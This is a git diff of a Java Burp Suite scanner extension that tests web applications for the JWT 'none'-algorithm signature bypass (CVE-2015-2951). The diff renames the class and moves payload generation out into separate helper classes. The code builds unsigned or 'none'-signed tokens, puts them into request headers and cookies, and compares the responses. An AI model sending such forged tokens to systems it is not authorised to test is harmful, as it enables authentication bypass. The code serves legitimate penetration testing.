@@ -2,31 +2,20 @@ package burp.core.scanner.active.jwtscanner;
 
 import burp.*;
 import burp.core.scanner.active.BaseActiveScanner;
-import burp.core.scanner.active.IBaseScanner;
+import burp.core.scanner.active.IActiveScanner;
 import burp.utils.BurpAnalyzedRequest;
 import burp.utils.TimeOutput;
-import com.alibaba.fastjson.JSONObject;
-import com.auth0.jwt.algorithms.Algorithm;
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.PrintWriter;
-import java.net.MalformedURLException;
-import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
-// CVE-2015-2951
-public class JWTNoneWeakScanner extends BaseActiveScanner implements ActionListener, Runnable, IBaseScanner {
+public class JWTLeakScanner extends BaseActiveScanner implements ActionListener, Runnable, IActiveScanner {
 
-    private IBurpExtenderCallbacks callbacks;
-    private IExtensionHelpers helpers;
-    private BurpAnalyzedRequest burpAnalyzedRequest;
-    private IHttpRequestResponse httpRequestResponse;
-    private PrintWriter stdout;
-
-    public JWTNoneWeakScanner(IBurpExtenderCallbacks callbacks, IHttpRequestResponse httpRequestResponse){
-        super("JwtNoneScanner");
+    public JWTLeakScanner(IBurpExtenderCallbacks callbacks, IHttpRequestResponse httpRequestResponse){
+        super("JWTLeakScanner");
         this.callbacks = callbacks;
         this.helpers = callbacks.getHelpers();
         this.burpAnalyzedRequest = new BurpAnalyzedRequest();
@@ -34,39 +23,41 @@ public class JWTNoneWeakScanner extends BaseActiveScanner implements ActionListe
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
     }
 
-    public List<String> getPayload(){
-        // 拼接三种常用的NONE, None, none, nOne的none签名jwt形式
-        List<String> checkJwtList = new ArrayList<String>();
-        for (IJwtConstant.NoneFlag value : IJwtConstant.NoneFlag.values()) {
-            MYJwt myJwt = new MYJwt(JWTUtils.verifyJwt(this.httpRequestResponse));
-            JSONObject jsonObject = JSONObject.parseObject(myJwt.getHeaderJson());
-            jsonObject.replace("alg", value);
-            myJwt.setHeaderJson(jsonObject.toJSONString());
-            String b64JwtHeader = myJwt.sign(Algorithm.none());
-            checkJwtList.add(b64JwtHeader);
-        }
+    /**
+     * Invoked when an action occurs.
+     *
+     * @param e
+     */
+    @Override
+    public void actionPerformed(ActionEvent e)  {
+        new Thread(this).start();
+    }
 
-        return checkJwtList;
+    public List<String> getPayload(){
+        List<String> payloadList = new NoneLeak(this.httpRequestResponse).getExp();
+        String noVerifyLeak = new NoVerifyLeak(this.httpRequestResponse).getExp();
+        payloadList.add(noVerifyLeak);
+        return payloadList;
     }
 
     /*
-    * 构建四个数据包，进行发包处理
-    * 1、haeders头需要处理
-    * 2、cookie头需要处理
-    * */
+     * 构建四个数据包，进行发包处理
+     * 1、haeders头需要处理
+     * 2、cookie头需要处理
+     * */
     public List<IHttpRequestResponse> sendPayload()  {
         List<IHttpRequestResponse> responseList = new ArrayList<>();
-        List<String> unsignList = this.getPayload();
+        List<String> payloadList = this.getPayload();
 
         IRequestInfo RequestInfo = this.helpers.analyzeRequest(this.httpRequestResponse);
         List<String> headers = RequestInfo.getHeaders();
 
         List<IParameter> parameters = burpAnalyzedRequest.getAllParamters(this.httpRequestResponse);
 
-        for (String noneJwt : unsignList) {
+        for (String payload : payloadList) {
             for (int i=0; i<headers.size(); i++) {
-                String s = headers.get(i).replaceFirst(IJwtConstant.regexpJwtPattern, noneJwt);
-                if (s.contains(noneJwt)){
+                String s = headers.get(i).replaceFirst(IJWTConstant.regexpJwtPattern, payload);
+                if (s.contains(payload)){
                     headers.set(i, s);
                 }
             }
@@ -76,7 +67,7 @@ public class JWTNoneWeakScanner extends BaseActiveScanner implements ActionListe
             for (IParameter parameter : parameters) {
                 String parameterName = parameter.getName();
                 String parameterValue = parameter.getValue();
-                String s = parameterValue.replaceFirst(IJwtConstant.regexpJwtPattern, noneJwt);
+                String s = parameterValue.replaceFirst(IJWTConstant.regexpJwtPattern, payload);
                 if (!s.equals(parameterValue)){
                     IParameter targetParam = this.helpers.getRequestParameter(this.httpRequestResponse.getRequest(), parameterName);
                     IParameter iParameter = this.helpers.buildParameter(parameterName, s, IParameter.PARAM_COOKIE);
@@ -91,30 +82,6 @@ public class JWTNoneWeakScanner extends BaseActiveScanner implements ActionListe
         }
 
         return responseList;
-    }
-
-    /*
-    * 构建Issue
-    * */
-    @Override
-    public IScanIssue exportIssue(IHttpRequestResponse requestResponse){
-        return new BurpScanIssue(
-                requestResponse.getHttpService(),
-                burpAnalyzedRequest.getUrl(requestResponse),
-                new IHttpRequestResponse[] { requestResponse },
-                "Jwt None Sign",
-                "it can help us to get everyone.",
-                "High");
-    }
-
-    /**
-     * Invoked when an action occurs.
-     *
-     * @param e
-     */
-    @Override
-    public void actionPerformed(ActionEvent e) {
-        new Thread(this).start();
     }
 
     /**
@@ -137,6 +104,7 @@ public class JWTNoneWeakScanner extends BaseActiveScanner implements ActionListe
         }
 
         List<IHttpRequestResponse> responseList = null;
+
         try {
             responseList = this.sendPayload(); // 发送payload
         }catch (Exception e){
@@ -147,7 +115,7 @@ public class JWTNoneWeakScanner extends BaseActiveScanner implements ActionListe
             return;
         }
 
-        // 每次jwt检测一共四次
+        // 每次jwt检测一共五次
         for (IHttpRequestResponse response : responseList) {
             byte[] baseResponse = response.getResponse();
 
@@ -175,8 +143,6 @@ public class JWTNoneWeakScanner extends BaseActiveScanner implements ActionListe
                             "[+] found jwt none",
                             response
                     );
-//                        break;
-
                 }else{
                     // 不一样则是none不存在，未检测出来问题也要更新任务状态至任务栏面板
                     BurpExtender.tags.update(
